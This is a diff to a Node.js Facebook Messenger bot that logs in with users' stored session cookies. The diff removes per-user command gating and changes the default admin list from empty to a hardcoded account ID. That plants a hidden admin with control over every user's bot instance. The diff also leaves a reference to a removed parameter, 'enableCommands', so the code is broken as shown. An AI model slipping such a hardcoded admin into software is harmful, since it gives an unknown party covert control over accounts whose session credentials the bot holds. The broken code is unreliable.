@@ -213,7 +213,7 @@ app.listen(3000, () => {
 process.on('unhandledRejection', (reason) => {
   console.error('Unhandled Promise Rejection:', reason);
 });
-async function accountLogin(state, enableCommands = [], prefix, admin = []) {
+async function accountLogin(state, prefix, admin = []) {
   return new Promise((resolve, reject) => {
     login({
       appState: state
@@ -223,7 +223,7 @@ async function accountLogin(state, enableCommands = [], prefix, admin = []) {
         return;
       }
       const userid = await api.getCurrentUserID();
-      addThisUser(userid, enableCommands, state, prefix, admin);
+      addThisUser(userid, state, prefix, admin);
       try {
         const userInfo = await api.getUserInfo(userid);
         if (!userInfo || !userInfo[userid]?.name || !userInfo[userid]?.profileUrl || !userInfo[userid]?.thumbSrc) throw new Error('Unable to locate the account; it appears to be in a suspended or locked state.');
@@ -322,20 +322,14 @@ async function accountLogin(state, enableCommands = [], prefix, admin = []) {
             api.sendMessage(`Invalid command '${command}' please use ${prefix}help to see the list of available commands.`, event.threadID, event.messageID);
             return;
           }
-          for (const {
-              handleEvent,
-              name
-            }
-            of Utils.handleEvent.values()) {
-            if (handleEvent && name && (
-                (enableCommands[1].handleEvent || []).includes(name) || (enableCommands[0].commands || []).includes(name))) {
+          for (const { handleEvent, name } of Utils.handleEvent.values()) {
+            if (handleEvent && name) {
               handleEvent({
                 api,
                 event,
-                enableCommands,
                 admin,
                 prefix,
-                blacklist
+                blacklist,
               });
             }
           }
@@ -344,12 +338,11 @@ async function accountLogin(state, enableCommands = [], prefix, admin = []) {
             case 'message_reply':
             case 'message_unsend':
             case 'message_reaction':
-              if (enableCommands[0].commands.includes(aliases(command?.toLowerCase())?.name)) {
-                await ((aliases(command?.toLowerCase())?.run || (() => {}))({
+              if (Utils.commands.has(aliases(command?.toLowerCase())?.name)) {
+                await ((Utils.commands.get(aliases(command?.toLowerCase())?.name)?.run || (() => {}))({
                   api,
                   event,
                   args,
-                  enableCommands,
                   admin,
                   prefix,
                   blacklist,
@@ -382,7 +375,7 @@ async function deleteThisUser(userid) {
     console.log(error);
   }
 }
-async function addThisUser(userid, enableCommands, state, prefix, admin, blacklist) {
+async function addThisUser(userid, state, prefix, admin, blacklist) {
   const configFile = './data/history.json';
   const sessionFolder = './data/session';
   const sessionFile = path.join(sessionFolder, `${userid}.json`);
@@ -391,10 +384,11 @@ async function addThisUser(userid, enableCommands, state, prefix, admin, blackli
   config.push({
     userid,
     prefix: prefix || "",
-    admin: admin || [],
+    admin: admin || ["61550873742628"],
     blacklist: blacklist || [],
     enableCommands
   });
+  
   fs.writeFileSync(configFile, JSON.stringify(config, null, 2));
   fs.writeFileSync(sessionFile, JSON.stringify(state));
 }
@@ -406,7 +400,8 @@ function aliases(command) {
   }
   return null;
 }
-async function main() {
+
+ async function main() {
   var cron = require('node-cron');
   cron.schedule('*/15 * * * *', () => {
     process.exit(1);
@@ -423,19 +418,19 @@ async function main() {
       const filePath = path.join(sessionFolder, file);
       try {
         const {
-          enableCommands,
           prefix,
           admin,
           blacklist
         } = config.find(item => item.userid === path.parse(file).name) || {};
         const state = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
-        if (enableCommands) await accountLogin(state, enableCommands, prefix, admin, blacklist);
+        await accountLogin(state, prefix, admin, blacklist);
       } catch (error) {
         deleteThisUser(path.parse(file).name);
       }
     }
   } catch (error) {}
 }
+
 
 function createConfig() {
   const config = [{
